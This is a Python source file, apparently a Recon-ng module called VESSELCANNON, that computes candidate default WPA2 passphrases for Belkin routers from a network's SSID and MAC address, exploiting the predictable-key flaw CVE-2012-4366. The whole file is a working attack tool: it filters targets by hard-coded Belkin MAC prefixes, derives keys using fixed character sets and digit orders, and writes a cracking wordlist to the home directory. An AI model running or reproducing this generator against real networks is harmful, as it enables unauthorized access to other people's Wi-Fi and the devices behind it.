from recon.core.module import BaseModule
import re
import os

class Module(BaseModule):

    meta = {
    'name':'VESSELCANNON',
    'author':'gwaffles (https://twitter.com/gwaffles_)',
    'description':'A belkin WPA2 default key generator.',
    'options':(
        ('ssid', None, True, 'The ssid to create a wordlist for.'),
        ('mac', None, True, 'The mac to create a wordlist for.'),
            ),
    'comments':(
        'CVE-2012-4366 (http://cve.circl.lu/cve/CVE-2012-4366)',
            ),
    }

    # Character sets.
    CHARSET  = '024613578ACE9BDF'
    charset  = '944626378ace9bdf'
    charsets = [CHARSET, charset]

    # Predictable value orders.
    ORDER_0  = [6,2,3,8,5,1,7,4]
    ORDER_1  = [1,2,3,8,5,1,7,4]
    ORDER_2  = [1,2,3,8,5,6,7,4]
    ORDER_3  = [6,2,3,8,5,6,7,4]
    orders   = [ORDER_0, ORDER_1, ORDER_2]

    # Belkin mac addresses
    targets  = ['94:44:52','08:86:3B','EC:1A:59',
                '00:11:50','00:22:75','14:91:82',
                'C0:56:27','94:10:3E','B4:75:0E',
                '00:17:3F','00:1C:DF']

    essids   = ['Belkin.XXXX','Belkin_XXXXXX','belkin.xxxx','belkin.xxx']

    def module_run(self):
        wordlist = self.options['ssid'].lower() + '.wordlist'
        _path = os.path.join(os.path.expanduser('~/'), wordlist)
        essid = self.options['ssid']
        bssid = self.options['mac'].upper()

        _state = self.verify_mac(bssid)

        if _state is True:
            self.output('Generating keys for %s ...' % essid)
            keys = self.keys(essid, bssid)
            lok = len(keys)
            self.write_wordlist(_path, keys)
            self.output('Generated %d keys.' % lok)
            self.output('Wordlist: %s' % _path)

        elif _state[0] is False and _state[1] == 'type':
            self.error('not a validate mac address.')

        elif _state[0] is False and _state[1] == 'targets':
            self.error('mac not in targets.')

    def validate_mac(self, address):
        '''Return True if it is a valid mac address.'''

        mac = re.compile("^((?:[0-9a-fA-F]{2}[:]){5}[0-9a-fA-F]{2})$")
        if not mac.match(address) or len(address) != 17:
            return False
        return True

    def verify_mac(self, mac):
        # Checks if the 'raw mac address' is validate.
        validate = self.validate_mac(mac)

        if validate is False:
            return (False, 'type')

        # Split the mac to compare to targets.
        _mac = mac.split(':')
        mac = _mac[0] + ':' + _mac[1] + ':' + _mac[2]

        # Compare vendor part of mac to targets.
        if mac not in self.targets:
            return (False, 'targets')

        return True

    def write_wordlist(self, path, keys):
        # parameter 'name' is path to wordlist file.
        with open(path, 'w') as _file_:
            for key in keys:
                _file_.write(key + '\n')
                _file_.flush() # Empty the data buffer before closing the file.

    def generate_key(self, wmac, charset=charset, order=ORDER_0):
        k = ''.join([wmac[order[i]-1] for i in xrange(len(wmac))])
        return ''.join([charset[int(c,16)] for c in k])

    def increment(self, bssid):
        return "%012X" % (int(bssid, 16) + 1)

    def keys(self, essid, bssid):
        _KEYS = []
        mac = bssid.replace(":", '').replace('-', '') # the BSSID has to be in a certain form for proper key generation.

        # CHARSET-wanmac
        if essid.startswith('B'):
            _KEYS.append(self.generate_key(mac[4:], self.CHARSET))

        # charset-wanmac
        elif essid.startswith('b'):
            mac = self.increment(mac)

            if mac.startswith('944452'):
                _KEYS.append(self.generate_key(mac[4:], self.charset))

            else:
                _KEYS.append(self.generate_key(mac[4:], self.charset))
                _KEYS.append(self.generate_key(mac[4:], self.charset, self.ORDER_2))
                mac = self.increment(mac)
                _KEYS.append(self.generate_key(mac[4:], self.charset))

        # Bruteforce, other possible combos.
        for i in xrange(3):
            for c in self.charsets:
                for o in self.orders:
                    _KEYS.append(self.generate_key(mac[4:], c, o))
            mac = self.increment(mac)

        _nodups = {}
        for key in _KEYS:
            _nodups[key] = 1
        return _nodups.keys() # To ensure that no duplicates will be used.
